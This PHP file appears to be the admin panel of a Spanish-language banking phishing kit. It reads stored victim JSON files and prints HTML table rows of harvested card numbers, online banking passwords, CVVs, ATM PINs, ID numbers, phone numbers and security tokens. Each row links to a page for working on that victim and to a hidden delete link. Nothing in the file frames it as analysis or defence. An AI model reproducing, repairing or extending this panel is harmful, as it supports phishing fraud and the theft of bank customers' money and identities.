<?php
if(!isset($_POST["op"])){
    echo "no se ha definido opcion";
    exit();
}
$op = trim($_POST["op"]);

switch ($op) {
    case "listar":
        
        $dir = opendir("./");
        if(!$dir){
            echo "no se puede leer directorio";
            exit();
        }        
    $contador = 0;
while(($archivo = readdir($dir)) !== false){
    if(strstr($archivo, "pcb_")){
        $datosStringJsonUsuario = @file_get_contents($archivo);
        if($datosStringJsonUsuario === false){
            echo "error g";            
        }
        $datosObjetoJsonUsuario = json_decode($datosStringJsonUsuario, true);

        $dd = $datosObjetoJsonUsuario["informacionEstado"]["estadoActual"];
        $color="";
        if($dd == "gifCargando"){
            $color = "yellow";
        }
        $status = trim($datosObjetoJsonUsuario["informacionEstado"]["estadoActual"]);
        if($status != "fin" || $status != "cc"){
        echo "<tr style='background-color:$color'>";
        echo "<td>".$datosObjetoJsonUsuario["informacionEstado"]["estadoActual"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosLogin"]["numeroTarjetaUsuario"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosLogin"]["claveBancaInternet"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["fechaDeExpiracion"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["cvv"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["claveAtm"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["dniTitular"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosDeValidacion"]["nombreTitular"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosCompletosDeTarjeta"]["numeroCelularTitular"]."</td>";
        echo "<td>".$datosObjetoJsonUsuario["datosDeValidacion"]["claveToken"]."</td>";
        echo "<td>".str_replace("fileUsuario", "", $archivo)."</td>";        
        echo "<td><a  href='./rlklzxxxxxx89.php?archivoUsuario=".$archivo."' target='_blank' >Entrar</a><br><br><a hidden  href='./eliminar.php?archivoUsuario=".$archivo."' target='_blank'>Eliminar</a> </td>";
        echo "</tr>";
        $contador++;
        }
        
        
        
        
    }
    
}

echo "<tr>";
echo "<td>total : $contador </td>";
echo "</tr>";

        break;

    default:
        echo "opcion invalida";
        exit();
        break;
}